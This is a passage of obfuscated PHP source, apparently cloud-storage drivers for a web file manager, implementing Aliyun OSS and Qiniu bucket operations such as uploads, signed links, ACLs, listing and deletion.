$_SERVER[™¾ÇÙ¯¹][564] ? !0 : !1; } public function pathAcl($ØÒºå¯) { $›„‘Ê„† =& $_SERVER[™¾ÇÙ¯¹]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $øü©¿ò = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ØÒºå¯)); } catch (OSS\Core\OssException $å¨§ùÁ“) { return !1; } $¹‡Ï “¯ = $øü©¿ò == $›„‘Ê„†[37] ? $this->bucketAcl : $øü©¿ò; if ($¹‡Ï “¯ == $›„‘Ê„†[1415]) { return $›„‘Ê„†[1414]; } if ($¹‡Ï “¯ == $›„‘Ê„†[1416]) { return $›„‘Ê„†[564]; } return $¹‡Ï “¯; } private function chmodPath($ï¸Îƒµá, $ÀôÁ´Ü„ = '') { $–üêèÖÈ =& $_SERVER[™¾ÇÙ¯¹]; $Ä‹ˆ†¤è = empty($ÀôÁ´Ü„) ? $–üêèÖÈ[1416] : $ÀôÁ´Ü„; $Åî‹‰¬Ê = array($–üêèÖÈ[37], $–üêèÖÈ[198], $–üêèÖÈ[1415], $–üêèÖÈ[1416]); if (!in_array($Ä‹ˆ†¤è, $Åî‹‰¬Ê)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ï¸Îƒµá), $Ä‹ˆ†¤è); } catch (OSS\Core\OssException $ã«›®æÜ) { return !1; } return !0; } public function getContent($Âø¾¸¦) { return $this->fileSubstr($Âø¾¸¦, -1); } public function setContent($Ôˆ×è¨, $’Ú¥“ó = '') { $ë½ÊÏÀÄ =& $_SERVER[™¾ÇÙ¯¹]; try { $•óñ·òŠ = $this->trafficLimit($ë½ÊÏÀÄ[1417]); $âŒµÔáˆ = $this->client->putObject($this->bucket, $this->pathEncode($Ôˆ×è¨), $’Ú¥“ó, $•óñ·òŠ); } catch (OSS\Core\OssException $ùå÷¡ãŒ) { return !1; } $Ÿ¶ÍœÕÌ = array($ë½ÊÏÀÄ[1407] => trim($âŒµÔáˆ[$ë½ÊÏÀÄ[1418]], $ë½ÊÏÀÄ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ôˆ×è¨))); $this->updateObjMeta($Ôˆ×è¨, $Ÿ¶ÍœÕÌ); return isset($âŒµÔáˆ[$ë½ÊÏÀÄ[1419]][$ë½ÊÏÀÄ[1366]]) ? !0 : !1; } private function updateObjMeta($ÒÌ‹İ», $³†û´š…) { $ÒÌ‹İ» = $this->pathEncode($ÒÌ‹İ»); try { $¡·Ô¥Ö¹ = array(OSS\OssClient::OSS_HEADERS => $³†û´š…); $this->client->copyObject($this->bucket, $ÒÌ‹İ», $this->bucket, $ÒÌ‹İ», $¡·Ô¥Ö¹); } catch (OSS\Core\OssException $í™šºêË) { return !1; } return !0; } public function upload($æÕÃ¹›³, $ì¨Ü«“ä, $ÜÄ¦°— = false, $—Ú«’¢¤ = REPEAT_REPLACE) { $ıˆ´ğéÙ =& $_SERVER[™¾ÇÙ¯¹]; $ùöÉ ı = trim($æÕÃ¹›³, $ıˆ´ğéÙ[8]); $•¾“‘› = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ıˆ´ğéÙ[1407] => @md5_file($ì¨Ü«“ä)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($æÕÃ¹›³))); $•¾“‘› = $this->trafficLimit($ıˆ´ğéÙ[1417], $•¾“‘›); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ùöÉ ı), $ì¨Ü«“ä, $•¾“‘›); } catch (OSS\Core\OssException $Ó™„‹ÖŸ) { return !1; } return $this->getPathOuter($æÕÃ¹›³); } public function getHost() { $ƒ†ãÊŸ¾ =& $_SERVER[™¾ÇÙ¯¹]; $ÍÂ©Íûû = explode($ƒ†ãÊŸ¾[183], parent::getHost()); return $ÍÂ©Íûû[0] . $ƒ†ãÊŸ¾[183] . $this->bucket . $ƒ†ãÊŸ¾[10] . $ÍÂ©Íûû[1]; } public function uploadFormData($­¢íª‘µ, $œÁ»ƒãü = 3600) { $ª³ªï© =& $_SERVER[™¾ÇÙ¯¹]; if (!($ÖÅ¬²àÃ = $this->getHost())) { return !1; } $‰ú¼“–Ë = $œÁ»ƒãü; $ºãç£óÎ = date($ª³ªï©[1420], time() + $‰ú¼“–Ë); $¡÷”€ø« = new DateTime($ºãç£óÎ); $Õ¦µ–Ã· = $¡÷”€ø«->format(DateTime::ISO8601); $ÆÔ‡‰Œà = strpos($Õ¦µ–Ã·, $ª³ªï©[305]); $Õ¦µ–Ã· = substr($Õ¦µ–Ã·, 0, $ÆÔ‡‰Œà) . $ª³ªï©[1421]; $ÅóÃôĞ³ = 1048576000 * 5; $øûõ©û‰ = $this->pathFather($­¢íª‘µ); $Ÿ‡Ôïº· = array($ª³ªï©[1320] => $Õ¦µ–Ã·, $ª³ªï©[1321] => array(array($ª³ªï©[1422], 0, $ÅóÃôĞ³), array($ª³ªï©[1324], $ª³ªï©[1325], $øûõ©û‰))); $˜ÈËĞŒÖ = base64_encode(json_encode($Ÿ‡Ôïº·)); $®«Âçšğ = base64_encode(hash_hmac($ª³ªï©[232], $˜ÈËĞŒÖ, $this->secret, !0)); $„ï§ä“… = array($ª³ªï©[1330] => $˜ÈËĞŒÖ, $ª³ªï©[1423] => $this->accessKey, $ª³ªï©[1326] => $ª³ªï©[1318], $ª³ªï©[1424] => $®«Âçšğ, $ª³ªï©[181] => $ÖÅ¬²àÃ); $„ï§ä“… = $this->trafficLimit($ª³ªï©[1417], $„ï§ä“…); return $„ï§ä“…; } public function multiUploadFormData($¶íéŸ¸½, $öœæÏ­À = 3600) { $óÏıÈÉà =& $_SERVER[™¾ÇÙ¯¹]; if (!($½è¦Œòµ = $this->getHost())) { return !1; } $ÑÜ„èàæ = $this->trafficLimit($óÏıÈÉà[1417]); $³Êë§Ëø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¶íéŸ¸½), $ÑÜ„èàæ); return array($óÏıÈÉà[223] => $³Êë§Ëø, $óÏıÈÉà[181] => $½è¦Œòµ . $óÏıÈÉà[8] . $this->pathEncode($¶íéŸ¸½), $óÏıÈÉà[224] => gmdate($óÏıÈÉà[1425]), $óÏıÈÉà[94] => $¶íéŸ¸½); } public function multiUploadAuthData($ªœ»¶œµ, $Ş•ÉúŸı = array()) { $ÃÌëÁÄ =& $_SERVER[™¾ÇÙ¯¹]; $Â‡ƒ¶¡ = isset($Ş•ÉúŸı[$ÃÌëÁÄ[224]]) ? $Ş•ÉúŸı[$ÃÌëÁÄ[224]] : gmdate($ÃÌëÁÄ[1425]); $Ó­¬ãÃİ = isset($Ş•ÉúŸı[$ÃÌëÁÄ[174]]) ? $Ş•ÉúŸı[$ÃÌëÁÄ[174]] : $ÃÌëÁÄ[12]; $Ğ£À€úË = $ªœ»¶œµ; if (isset($Ş•ÉúŸı[$ÃÌëÁÄ[94]])) { $Ğ£À€úË = $Ş•ÉúŸı[$ÃÌëÁÄ[94]]; unset($Ş•ÉúŸı[$ÃÌëÁÄ[94]]); } if (isset($Ş•ÉúŸı[$ÃÌëÁÄ[225]])) { $Ş•ÉúŸı[$ÃÌëÁÄ[224]] = $Â‡ƒ¶¡; return $this->listUploadParts($Ğ£À€úË, $Ş•ÉúŸı); } $€Ü…Êğ = array($ÃÌëÁÄ[226], $ÃÌëÁÄ[12], $ÃÌëÁÄ[120], $Â‡ƒ¶¡, "\170\x2d\x6f\163\163\x2d\x64\x61\164\145\x3a{$Â‡ƒ¶¡}", $ÃÌëÁÄ[8] . $this->bucket . $ÃÌëÁÄ[8] . $Ğ£À€úË . $Ó­¬ãÃİ); if (strpos($Ó­¬ãÃİ, $ÃÌëÁÄ[227]) === 0) { $€Ü…Êğ[0] = $ÃÌëÁÄ[228]; if ($·ö„“¼ = $this->trafficLimit($ÃÌëÁÄ[1417])) { $Ğ£À€úË = $ÃÌëÁÄ[1426]; array_splice($€Ü…Êğ, 5, 0, $Ğ£À€úË . $ÃÌëÁÄ[4] . $·ö„“¼[$Ğ£À€úË]); } } if (isset($Ş•ÉúŸı[$ÃÌëÁÄ[229]]) && $Ş•ÉúŸı[$ÃÌëÁÄ[229]] == $ÃÌëÁÄ[230]) { $€Ü…Êğ[0] = $ÃÌëÁÄ[230]; } if (!empty($Ş•ÉúŸı[$ÃÌëÁÄ[1427]])) { $ÏŒÅÙß = array_merge(array($€Ü…Êğ[4]), $Ş•ÉúŸı[$ÃÌëÁÄ[1427]]); sort($ÏŒÅÙß); $€Ü…Êğ[4] = implode($ÃÌëÁÄ[231], $ÏŒÅÙß); } $óƒ™¾ƒ = implode($ÃÌëÁÄ[231], $€Ü…Êğ); $—Øú—Æ× = base64_encode(hash_hmac($ÃÌëÁÄ[232], $óƒ™¾ƒ, $this->secret, !0)); $ĞÁ£ÊÕ± = $ÃÌëÁÄ[1391] . $this->accessKey . $ÃÌëÁÄ[4] . $—Øú—Æ×; if (strpos($Ó­¬ãÃİ, $ÃÌëÁÄ[227]) === 0) { $ĞÁ£ÊÕ± = array($ÃÌëÁÄ[234] => $ĞÁ£ÊÕ±, $ÃÌëÁÄ[224] => $Â‡ƒ¶¡); if ($·ö„“¼) { $ĞÁ£ÊÕ± = array_merge($ĞÁ£ÊÕ±, $·ö„“¼); } } return $ĞÁ£ÊÕ±; } public function listUploadParts($í®æ¬¾á, $…§Ü™‹) { $ÕÖ•‹ÉÜ =& $_SERVER[™¾ÇÙ¯¹]; $Ö‚›±÷ = parse_url_query($…§Ü™‹[$ÕÖ•‹ÉÜ[174]]); $™¢ƒæÄ¿ = $this->client->listParts($this->bucket, $this->pathEncode($í®æ¬¾á), $Ö‚›±÷[$ÕÖ•‹ÉÜ[223]]); $Ş…§¼‰ = $™¢ƒæÄ¿->getListPart(); $™¼½’¹ = array(); foreach ($Ş…§¼‰ as $•èÛğÚÍ) { $™¼½’¹[] = array($ÕÖ•‹ÉÜ[1411] => $•èÛğÚÍ->getPartNumber(), $ÕÖ•‹ÉÜ[1412] => trim($•èÛğÚÍ->getETag(), $ÕÖ•‹ÉÜ[118])); } unset($…§Ü™‹[$ÕÖ•‹ÉÜ[225]], $…§Ü™‹[$ÕÖ•‹ÉÜ[229]]); $ûÌ©Âö€ = $this->multiUploadAuthData($í®æ¬¾á, $…§Ü™‹); if (empty($ûÌ©Âö€)) { return !1; } return array($ÕÖ•‹ÉÜ[234] => $ûÌ©Âö€, $ÕÖ•‹ÉÜ[224] => $…§Ü™‹[$ÕÖ•‹ÉÜ[224]], $ÕÖ•‹ÉÜ[236] => $™¼½’¹); } public function download($úúœÆ¹§, $×¤•Ş‚å) { if ($this->isFolder($úúœÆ¹§)) { return !1; } try { $É¸å‘¥È = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $×¤•Ş‚å); $É¸å‘¥È = $this->trafficLimit($_SERVER[™¾ÇÙ¯¹][109], $É¸å‘¥È); $this->client->getObject($this->bucket, $this->pathEncode($úúœÆ¹§), $É¸å‘¥È); } catch (OSS\Core\OssException $ÃÃ¶ì’¥) { return !1; } return $×¤•Ş‚å; } public function fileSubstr($°şå¿ƒâ, $íºÄÌø = 0, $ñàş´Õ = false) { if ($íºÄÌø === -1) { $ÙÙİÏ»É = array(); } else { if ($ñàş´Õ === !1) { $Ù•†šŠ± = $this->size($°şå¿ƒâ); } else { $Ù•†šŠ± = $íºÄÌø + $ñàş´Õ - 1; } $ÙÙİÏ»É = array(OSS\OssClient::OSS_RANGE => "{$íºÄÌø}\x2d{$Ù•†šŠ±}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($°şå¿ƒâ), $ÙÙİÏ»É); } catch (OSS\Core\OssException $ªÕôŸı®) { think_exception($ªÕôŸı®->getMessage()); return !1; } } private function trafficLimit($Ğ‹ê¸Æ–, $¸Œ™Ì‚§ = array()) { $å®Ï½ë =& $_SERVER[™¾ÇÙ¯¹]; if ($Ğ‹ê¸Æ– == $å®Ï½ë[1417] && $this->isUploadServer() || $Ğ‹ê¸Æ– == $å®Ï½ë[109] && $this->isFileOutServer()) { return $¸Œ™Ì‚§; } $ñ˜ô¼õ = floatval($GLOBALS[$å®Ï½ë[6]][$å®Ï½ë[89]][$å®Ï½ë[107]][$Ğ‹ê¸Æ–]) * 1024 * 1024 * 8; if (!$ñ˜ô¼õ) { return $¸Œ™Ì‚§; } $ñ˜ô¼õ = $ñ˜ô¼õ < 819200 ? 819200 : ($ñ˜ô¼õ > 838860800 ? 838860800 : $ñ˜ô¼õ); $¸Œ™Ì‚§[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ñ˜ô¼õ); return $¸Œ™Ì‚§; } public function link($÷²úüÍÏ, $Ã¹ÆƒôÌ = array()) { $×éÃÉ€¦ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->exist($÷²úüÍÏ) || $this->isFolder($÷²úüÍÏ)) { return !1; } try { $Ã¹ÆƒôÌ = $this->trafficLimit($×éÃÉ€¦[109], $Ã¹ÆƒôÌ); $ã¦¾áÑú = $this->client->signUrl($this->bucket, $this->pathEncode($÷²úüÍÏ), 3600 * 12, $×éÃÉ€¦[230], $Ã¹ÆƒôÌ); return $this->getCdnLink($ã¦¾áÑú); } catch (OSS\Core\OssException $ĞÏ·‘Á) { return !1; } } public function fileOut($¶ÓèÜ¨, $àĞğËœö = false, $ÜÅéñãÛ = false, $Òß‡¯½ü = '') { $ÅİÕøú¨ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶ÓèÜ¨, $àĞğËœö, $ÜÅéñãÛ, $Òß‡¯½ü); } if (!$ÜÅéñãÛ) { $ÜÅéñãÛ = $this->pathThis($¶ÓèÜ¨); } $ÜÅéñãÛ = rawurlencode($ÜÅéñãÛ); $ş„ÁÕù = get_file_mime(get_path_ext($ÜÅéñãÛ)); if ($ş„ÁÕù == $ÅİÕøú¨[217]) { return parent::fileOut($¶ÓèÜ¨, $àĞğËœö, $ÜÅéñãÛ, $Òß‡¯½ü); } $àĞğËœö = $àĞğËœö ? $ÅİÕøú¨[1428] : $ÅİÕøú¨[1429]; $Ñ»­Ò¯ñ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÅİÕøú¨[1430] . rawurlencode("{$àĞğËœö}\x3b\146\x69\154\x65\156\x61\155\145\x3d{$ÜÅéñãÛ}")); $Ñ»­Ò¯ñ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÅİÕøú¨[1431] . rawurlencode($ş„ÁÕù); $Å²µİ¹ü = $this->link($¶ÓèÜ¨, $Ñ»­Ò¯ñ); $this->fileOutLink($Å²µİ¹ü); } public function fileOutServer($¯éñÑ¶², $Ë½ĞÒ¢÷ = false, $¤Øûúåú = false, $ñİÌß®Ó = '') { parent::fileOut($¯éñÑ¶², $Ë½ĞÒ¢÷, $¤Øûúåú, $ñİÌß®Ó); } public function fileOutImage($°£œ¦Î, $Å•±‡û = 250) { $ÈƒËµª = array(OSS\OssClient::OSS_PROCESS => $_SERVER[™¾ÇÙ¯¹][1432] . $Å•±‡û); $ÃŠ¸¦·á = $this->link($°£œ¦Î, $ÈƒËµª); $this->fileOutLink($ÃŠ¸¦·á); } public function fileOutImageServer($œ€¿‰ú’, $”ç¿ù©Ê = 250) { parent::fileOutImage($œ€¿‰ú’, $”ç¿ù©Ê); } public function fileOutLink($¾ØÅªèÓ) { $îæÏŸâã =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->isCdnHost() && substr($¾ØÅªèÓ, 0, 7) == $îæÏŸâã[1333]) { $¾ØÅªèÓ = $îæÏŸâã[1334] . substr($¾ØÅªèÓ, 7); } header($îæÏŸâã[161] . $¾ØÅªèÓ); die; } public function hashMd5($©™§ôŒÆ, $ˆêÊ¤åÔ = '') { $•¾à•Ç =& $_SERVER[™¾ÇÙ¯¹]; $Ô£÷ƒ ª = $this->_objectMeta($©™§ôŒÆ); if (!$Ô£÷ƒ ª) { return $•¾à•Ç[12]; } if (!isset($Ô£÷ƒ ª[$•¾à•Ç[1407]]) && !empty($ˆêÊ¤åÔ)) { $÷ ¸›«¬ = $this->updateObjMeta($©™§ôŒÆ, array($•¾à•Ç[1407] => $ˆêÊ¤åÔ)); $Ô£÷ƒ ª[$•¾à•Ç[1407]] = $÷ ¸›«¬ ? $ˆêÊ¤åÔ : $•¾à•Ç[12]; } return isset($Ô£÷ƒ ª[$•¾à•Ç[1407]]) ? strtolower($Ô£÷ƒ ª[$•¾à•Ç[1407]]) : $•¾à•Ç[12]; } public function size($ÕèØ—†„) { $ŸôŞƒ£½ = $this->objectMeta($ÕèØ—†„); return $ŸôŞƒ£½ ? $ŸôŞƒ£½[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function info($†ºÍëœ) { if ($this->isFolder($†ºÍëœ)) { return $this->folderInfo($†ºÍëœ); } else { if ($this->isFile($†ºÍëœ)) { return $this->fileInfo($†ºÍëœ); } } return !1; } public function exist($¬¹Šş¾ø) { return $this->isFile($¬¹Šş¾ø) || $this->isFolder($¬¹Šş¾ø); } public function isFile($•¸Æ¶Í±) { return !$this->isFolder($•¸Æ¶Í±) && $this->objectMeta($•¸Æ¶Í±); } public function isFolder($¹Ü¯´àÈ) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][165], $¹Ü¯´àÈ); } protected function objectMeta($ÚíæÆó–) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][167], $ÚíæÆó–); } protected function _objectMeta($ÁˆÔŞ™’) { $ò–Èâàß =& $_SERVER[™¾ÇÙ¯¹]; try { $Û¸êšÊä = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÁˆÔŞ™’)); } catch (OSS\Core\OssException $¢²õØÆ¬) { $Û¸êšÊä = !1; } if ($Û¸êšÊä) { $Û¸êšÊä[$ò–Èâàß[76]] = intval($Û¸êšÊä[$ò–Èâàß[1405]]); } return $Û¸êšÊä; } protected function _isFolder($»‰±æÂ) { $¹ï©ÓÕî =& $_SERVER[™¾ÇÙ¯¹]; if ($»‰±æÂ == $¹ï©ÓÕî[12] || $»‰±æÂ == $¹ï©ÓÕî[8]) { return !0; } $µÃ…„€ = array($¹ï©ÓÕî[1401] => $¹ï©ÓÕî[8], $¹ï©ÓÕî[1402] => rtrim($»‰±æÂ, $¹ï©ÓÕî[8]) . $¹ï©ÓÕî[8], $¹ï©ÓÕî[1403] => 1, $¹ï©ÓÕî[1404] => $¹ï©ÓÕî[12]); $ÏÃ•‹ù¸ = $this->client->listObjects($this->bucket, $µÃ…„€); if ($ÏÃ•‹ù¸->getObjectList() || $ÏÃ•‹ù¸->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Œ÷Ë¹») { parent::__construct(); require_once SDK_DIR . $_SERVER[™¾ÇÙ¯¹][1433]; $this->_init($Œ÷Ë¹»); } public function _init($¥é×À¸Ä) { $õ‘ºãğú =& $_SERVER[™¾ÇÙ¯¹]; foreach ($¥é×À¸Ä as $áúş¦Ê¸ => $ì§û¶ƒ‹) { if (isset($this->{$áúş¦Ê¸})) { $this->{$áúş¦Ê¸} = $ì§û¶ƒ‹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($õ‘ºãğú[1434] . LNG($õ‘ºãğú[1392])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($·È«Ó’‹, $‘ñÉ© = '', $ÛëÂ«Ä“ = REPEAT_RENAME) { if ($this->setContent($·È«Ó’‹, $‘ñÉ©)) { return $this->getPathOuter($·È«Ó’‹); } return !1; } public function mkdir($À½©ÆóÅ, $óÌ¦¼ù¤ = REPEAT_SKIP) { $ÍÕ…¯¢ƒ =& $_SERVER[™¾ÇÙ¯¹]; $ìıí¼á‘ = trim($À½©ÆóÅ, $ÍÕ…¯¢ƒ[8]); if ($this->_isFolder($ìıí¼á‘)) { return $this->getPathOuter($ìıí¼á‘); } $À½©ÆóÅ = $ìıí¼á‘ . $ÍÕ…¯¢ƒ[8]; $ïÈÈÅğ = get_path_this($ìıí¼á‘); $¨ÃîÚïÊ = $À½©ÆóÅ . $ïÈÈÅğ; if (!$this->mkfile($¨ÃîÚïÊ)) { return !1; } if (!$this->moveFile($¨ÃîÚïÊ, $À½©ÆóÅ)) { $this->delFile($¨ÃîÚïÊ); return !1; } return $this->getPathOuter($ìıí¼á‘); } public function copyFile($Ñª“ÓÙÕ, $±İàÇÌı) { $ñ×†Ò×Ç = $this->bucketManager->copy($this->bucket, $Ñª“ÓÙÕ, $this->bucket, $±İàÇÌı, !0); return $ñ×†Ò×Ç ? !1 : $this->getPathOuter($±İàÇÌı); } public function moveFile($ÙÂğÁ­ñ, $Ó¯ñœú) { $ÂøÇØÔ… = $this->bucketManager->move($this->bucket, $ÙÂğÁ­ñ, $this->bucket, $Ó¯ñœú, !0); return $ÂøÇØÔ… ? !1 : $this->getPathOuter($Ó¯ñœú); } public function delFile($ÚË¼Ö·„) { if (!$this->exist($ÚË¼Ö·„)) { return !0; } $Â¡óœÄÌ = $this->bucketManager->delete($this->bucket, $ÚË¼Ö·„); return $Â¡óœÄÌ ? !1 : !0; } public function delFolder($…è¹¬Û) { $ˆ©Ù²éº =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->exist($…è¹¬Û)) { return !0; } $this->listItemCache = !1; $ßğ¹Á = $this->fileList($…è¹¬Û); $this->listItemCache = !0; $ÑºÕ•äÖ = trim($…è¹¬Û, $ˆ©Ù²éº[8]) . $ˆ©Ù²éº[8]; if (!empty($…è¹¬Û) && $…è¹¬Û !== $ˆ©Ù²éº[197] && !in_array($ÑºÕ•äÖ, $ßğ¹Á[$ˆ©Ù²éº[82]])) { $ßğ¹Á[$ˆ©Ù²éº[82]][] = $ÑºÕ•äÖ; } $»€ï”äÛ = $this->delByBatch($ßğ¹Á[$ˆ©Ù²éº[83]]); if (!$»€ï”äÛ) { return !1; } $»€ï”äÛ = $this->delByBatch($ßğ¹Á[$ˆ©Ù²éº[82]]); if (!$»€ï”äÛ) { return !1; } return $this->delFile($ÑºÕ•äÖ); } private function delByBatch($×ñã†·ñ) { foreach (array_chunk($×ñã†·ñ, 1000) as $‚€²Ãı) { $ÓûŠ¸„ = $this->bucketManager->buildBatchDelete($this->bucket, $‚€²Ãı); list($ÉªËĞÏ, $à³ïû“º) = $this->bucketManager->batch($ÓûŠ¸„); if ($à³ïû“º) { return !1; } } return !0; } public function rename($ïÊ ÀÎ, $Ù—ıº) { return $this->renameObject($ïÊ ÀÎ, $Ù—ıº); } public function fileInfo($‰Ø„™«ğ, $ Óêö­ = false, $©ÉÍé¥« = array()) { $‘Ú„¡ó’ =& $_SERVER[™¾ÇÙ¯¹]; $À¶“È ™ = array($‘Ú„¡ó’[32] => $this->pathThis($‰Ø„™«ğ), $‘Ú„¡ó’[84] => $this->getPathOuter($‘Ú„¡ó’[8] . $‰Ø„™«ğ), $‘Ú„¡ó’[33] => $‘Ú„¡ó’[199], $‘Ú„¡ó’[76] => isset($©ÉÍé¥«[$‘Ú„¡ó’[1435]]) ? $©ÉÍé¥«[$‘Ú„¡ó’[1435]] : 0, $‘Ú„¡ó’[174] => $this->ext($‰Ø„™«ğ)); if ($ Óêö­) { return $À¶“È ™; } $À¶“È ™[$‘Ú„¡ó’[200]] = $À¶“È ™[$‘Ú„¡ó’[85]] = 0; $À¶“È ™[$‘Ú„¡ó’[201]] = $À¶“È ™[$‘Ú„¡ó’[202]] = !0; if (empty($©ÉÍé¥«)) { $©ÉÍé¥« = $this->objectMeta($‰Ø„™«ğ); if (!$©ÉÍé¥«) { return $À¶“È ™; } } if (isset($©ÉÍé¥«[$‘Ú„¡ó’[1436]])) { $À¶“È ™[$‘Ú„¡ó’[85]] = substr($©ÉÍé¥«[$‘Ú„¡ó’[1436]] . $‘Ú„¡ó’[12], 0, 10); } if (isset($©ÉÍé¥«[$‘Ú„¡ó’[1435]])) { $À¶“È ™[$‘Ú„¡ó’[76]] = $©ÉÍé¥«[$‘Ú„¡ó’[1435]]; } return $À¶“È ™; } public function folderInfo($´ÇÍ‚šå, $ñœˆğ­ = false) { $£ĞõÓŠÖ =& $_SERVER[™¾ÇÙ¯¹]; $íŠòâà = array($£ĞõÓŠÖ[32] => $this->pathThis($´ÇÍ‚šå), $£ĞõÓŠÖ[84] => $this->getPathOuter($£ĞõÓŠÖ[8] . $´ÇÍ‚šå), $£ĞõÓŠÖ[33] => $£ĞõÓŠÖ[75]); if ($ñœˆğ­) { return $íŠòâà; } $íŠòâà[$£ĞõÓŠÖ[200]] = $íŠòâà[$£ĞõÓŠÖ[85]] = 0; $íŠòâà[$£ĞõÓŠÖ[201]] = $íŠòâà[$£ĞõÓŠÖ[202]] = !0; $´ÇÍ‚šå = rtrim($´ÇÍ‚šå, $£ĞõÓŠÖ[8]) . $£ĞõÓŠÖ[8]; $üğİŸÆ = $this->objectMeta($´ÇÍ‚šå); if (isset($üğİŸÆ[$£ĞõÓŠÖ[1436]])) { $íŠòâà[$£ĞõÓŠÖ[85]] = substr($üğİŸÆ[$£ĞõÓŠÖ[1436]] . $£ĞõÓŠÖ[12], 0, 10); } return $íŠòâà; } public function listPath($–áºú¹Ñ, $˜¹«§Óå = false) { $ŠÃ¾Şœó =& $_SERVER[™¾ÇÙ¯¹]; $ÔæììŠø = $this->fileList($–áºú¹Ñ, $ŠÃ¾Şœó[8], !0); foreach ($ÔæììŠø[$ŠÃ¾Şœó[82]] as $ÍóÙòÊş => $Í±öğ³Ö) { $ÔæììŠø[$ŠÃ¾Şœó[82]][$ÍóÙòÊş] = $this->folderInfo($Í±öğ³Ö, $˜¹«§Óå); } foreach ($ÔæììŠø[$ŠÃ¾Şœó[83]] as $ÍóÙòÊş => $Í±öğ³Ö) { $ÔæììŠø[$ŠÃ¾Şœó[83]][$ÍóÙòÊş] = $this->fileInfo($Í±öğ³Ö[$ŠÃ¾Şœó[94]], $˜¹«§Óå, $Í±öğ³Ö); } return $ÔæììŠø; } public function has($×Óòó¸Ï, $í”õŠ‚ = false, $ õÉ„©œ = true) { $é®À’º“ =& $_SERVER[™¾ÇÙ¯¹]; $×Óòó¸Ï = trim($×Óòó¸Ï, $é®À’º“[8]); $Ä­²¦­… = empty($×Óòó¸Ï) && $×Óòó¸Ï !== $é®À’º“[197] ? $é®À’º“[12] : $×Óòó¸Ï . $é®À’º“[8]; $©ŠÛ°‰ã = $é®À’º“[12]; $Ëü‚±¼Ù = 500; $º®ŞÕà‚ = $é®À’º“[8]; $£ĞâÏ¾ = $µœõ–Å = 0; while (!0) { check_abort(); list($ùçãïıÛ, $Ø˜»½ê—) = $this->bucketManager->listFiles($this->bucket, $Ä­²¦­…, $©ŠÛ°‰ã, $Ëü‚±¼Ù, $º®ŞÕà‚); if ($Ø˜»½ê—) { break; } $©ŠÛ°‰ã = array_key_exists($é®À’º“[1404], $ùçãïıÛ) ? $©ŠÛ°‰ã = $ùçãïıÛ[$é®À’º“[1437]] : $é®À’º“[12]; if ($í”õŠ‚) { if (!empty($ùçãïıÛ[$é®À’º“[1438]])) { $£ĞâÏ¾ += count($ùçãïıÛ[$é®À’º“[1438]]); } if (!empty($ùçãïıÛ[$é®À’º“[1439]])) { $µœõ–Å += count($ùçãïıÛ[$é®À’º“[1439]]); } if ($©ŠÛ°‰ã === $é®À’º“[12]) { break; } continue; } if ($ õÉ„©œ) { if (!empty($ùçãïıÛ[$é®À’º“[1438]])) { return !0; } } else { if (!empty($ùçãïıÛ[$é®À’º“[1439]])) { return !0; } } if ($©ŠÛ°‰ã === $é®À’º“[12]) { break; } } if ($í”õŠ‚) { return array($é®À’º“[207] => $£ĞâÏ¾, $é®À’º“[208] => $µœõ–Å); } return !1; } public function listAll($õŒˆç…) { $‚¥Ø´×– =& $_SERVER[™¾ÇÙ¯¹]; $ƒ·‚®Œ¾ = $this->fileList($õŒˆç…, $‚¥Ø´×–[12], !0); $Ÿ¿öºÁ = array(); foreach ($ƒ·‚®Œ¾[$‚¥Ø´×–[83]] as $ş½Œé¶¼) { $Ÿ¿öºÁ[$ş½Œé¶¼[$‚¥Ø´×–[94]]] = $ş½Œé¶¼[$‚¥Ø´×–[76]]; } foreach ($ƒ·‚®Œ¾[$‚¥Ø´×–[82]] as $ş½Œé¶¼) { if (is_string($ş½Œé¶¼)) { $Ÿ¿öºÁ[$ş½Œé¶¼] = 0; } } return $this->listAllFiles($õŒˆç…, array_keys($Ÿ¿öºÁ), $Ÿ¿öºÁ); } private function fileList($ì¯—‰ÑØ, $×¥ŸË»£ = '', $çÓö´âÔ = 0) { $„ÜÆáÕ© =& $_SERVER[™¾ÇÙ¯¹]; $ì¯—‰ÑØ = trim($ì¯—‰ÑØ, $„ÜÆáÕ©[8]); $ù»©¸Î¥ = empty($ì¯—‰ÑØ) && $ì¯—‰ÑØ !== $„ÜÆáÕ©[197] ? $„ÜÆáÕ©[12] : $ì¯—‰ÑØ . $„ÜÆáÕ©[8]; $õó „¶ô = $„ÜÆáÕ©[12]; $›ø¶‚õ = 1000; $×ó¹¼èœ = $çõ‹š¶° = array(); while (!0) { check_abort(); list($Ü¾‹äı, $º­¬¼±†) 